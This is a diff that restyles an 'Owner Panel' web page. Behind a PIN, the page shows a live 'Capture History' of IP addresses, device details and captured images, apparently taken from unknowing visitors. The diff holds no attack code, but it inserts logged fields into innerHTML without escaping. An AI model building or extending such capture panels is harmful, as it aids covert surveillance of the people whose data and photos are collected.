@@ -6,42 +6,87 @@
   <title>Owner Panel</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
-    /* Animation para mag-blink kapag may bagong log */
+    /* Glass effect reusable */
+    .glass {
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+    }
+
+    /* Neon glow title */
+    .neon-text {
+      background: linear-gradient(90deg, #00f5ff, #7b2ff7, #ff00d4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: 800;
+      animation: glow 3s ease-in-out infinite alternate;
+    }
+    @keyframes glow {
+      from {
+        text-shadow: 0 0 10px rgba(0, 245, 255, 0.6),
+                     0 0 20px rgba(123, 47, 247, 0.6),
+                     0 0 30px rgba(255, 0, 212, 0.4);
+      }
+      to {
+        text-shadow: 0 0 20px rgba(0, 245, 255, 1),
+                     0 0 40px rgba(123, 47, 247, 0.8),
+                     0 0 60px rgba(255, 0, 212, 0.7);
+      }
+    }
+
+    /* Smooth fade-in */
+    .fade-in {
+      animation: fadeIn 1s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Blink highlight for new logs */
     .highlight {
-      animation: blink 1s ease-in-out 3;
+      animation: blink 1.2s ease-in-out 2;
     }
     @keyframes blink {
-      0%, 100% { background-color: #1f2937; } /* gray-800 */
-      50% { background-color: #4ade80; }      /* green-400 */
+      0%, 100% { box-shadow: 0 0 10px rgba(0, 245, 255, 0.4); }
+      50% { box-shadow: 0 0 20px rgba(255, 0, 212, 0.7); }
     }
   </style>
 </head>
-<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen">
+<body class="bg-gradient-to-br from-gray-900 via-indigo-900 to-black text-white flex flex-col items-center justify-center min-h-screen">
 
   <!-- Navbar -->
-  <nav class="w-full bg-gray-800 p-4 flex justify-between items-center">
-    <h1 class="text-xl font-bold">🔑 Owner Panel</h1>
-    <button onclick="toggleMenu()" class="text-2xl">☰</button>
-    <div id="navLinks" class="hidden absolute top-14 right-4 bg-gray-700 rounded shadow-lg">
-      <a href="index.html" class="block px-4 py-2 hover:bg-gray-600">Home</a>
-      <a href="owner.html" class="block px-4 py-2 hover:bg-gray-600">Owner</a>
+  <nav class="w-full glass p-4 flex justify-between items-center shadow-lg">
+    <h1 class="text-xl font-bold tracking-wide neon-text">🔑 Owner Panel</h1>
+    <button onclick="toggleMenu()" class="text-2xl hover:text-cyan-400 transition">☰</button>
+    <div id="navLinks" class="hidden absolute top-14 right-4 glass rounded-xl shadow-lg overflow-hidden">
+      <a href="index.html" class="block px-6 py-3 hover:bg-cyan-600/40 transition">Home</a>
+      <a href="owner.html" class="block px-6 py-3 hover:bg-purple-600/40 transition">Owner</a>
     </div>
   </nav>
 
-  <!-- Owner PIN -->
-  <div id="pinSection" class="mt-10 text-center">
+  <!-- Owner PIN Section -->
+  <div id="pinSection" class="mt-12 text-center fade-in glass p-8 rounded-2xl shadow-lg max-w-sm">
     <h2 class="text-2xl font-semibold mb-4">Enter Owner PIN</h2>
-    <input id="ownerPin" type="password" placeholder="PIN" class="px-3 py-2 rounded text-black">
-    <button onclick="checkOwner()" class="bg-green-500 px-4 py-2 ml-2 rounded hover:bg-green-600">Unlock</button>
+    <input id="ownerPin" type="password" placeholder="PIN" 
+           class="px-3 py-2 rounded text-black focus:ring-2 focus:ring-cyan-400">
+    <button onclick="checkOwner()" 
+            class="bg-gradient-to-r from-cyan-500 to-purple-600 px-4 py-2 ml-2 rounded hover:opacity-90 transition">Unlock</button>
   </div>
 
-  <!-- Logs -->
-  <div id="logs" class="hidden mt-10 w-3/4 max-w-lg">
-    <h2 class="text-xl font-bold mb-4">📂 Capture History</h2>
-    <button onclick="clearLogs()" class="bg-red-500 px-3 py-1 rounded mb-4 hover:bg-red-600">Clear All</button>
-    <div id="logContainer"></div>
+  <!-- Logs Section -->
+  <div id="logs" class="hidden mt-10 w-11/12 max-w-2xl fade-in">
+    <!-- Animated Owner Name -->
+    <div class="mb-6 text-center">
+      <h2 class="text-4xl neon-text">👑 Welcome, Owner</h2>
+    </div>
+    <h3 class="text-xl font-bold mb-4">📂 Capture History</h3>
+    <button onclick="clearLogs()" class="bg-gradient-to-r from-pink-500 to-red-600 px-4 py-2 rounded mb-4 hover:opacity-90 transition">Clear All</button>
+    <div id="logContainer" class="space-y-4"></div>
   </div>
 
+  <!-- Notification Sound -->
   <audio id="notifySound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
 
   <script src="/socket.io/socket.io.js"></script>
@@ -66,7 +111,7 @@
       });
 
       socket.on("clear-captures", () => {
-        document.getElementById("logContainer").innerHTML = "<p>All captures cleared.</p>";
+        document.getElementById("logContainer").innerHTML = "<p class='text-gray-400'>All captures cleared.</p>";
       });
 
     } else {
@@ -82,7 +127,7 @@
         container.innerHTML = "";
 
         if (logs.length === 0) {
-          container.innerHTML = "<p>No captures yet.</p>";
+          container.innerHTML = "<p class='text-gray-400'>No captures yet.</p>";
           return;
         }
 
@@ -93,12 +138,12 @@
   function addLog(log, prepend = false) {
     const container = document.getElementById("logContainer");
     const div = document.createElement("div");
-    div.className = "bg-gray-800 p-3 rounded mb-3 shadow";
+    div.className = "glass p-4 rounded-xl shadow-lg transition";
     div.innerHTML = `
-      🕒 ${log.time} <br>
-      🌍 IP: ${log.ip} <br>
-      📱 Device: ${log.device} <br>
-      <img src="${log.img}" width="200" class="mt-2 rounded">
+      <p class="mb-1">🕒 <span class="text-gray-300">${log.time}</span></p>
+      <p class="mb-1">🌍 <span class="text-gray-300">${log.ip}</span></p>
+      <p class="mb-2">📱 <span class="text-gray-300">${log.device}</span></p>
+      <img src="${log.img}" width="250" class="mt-2 rounded-lg border border-gray-700 shadow">
     `;
     if (prepend) {
       container.prepend(div);
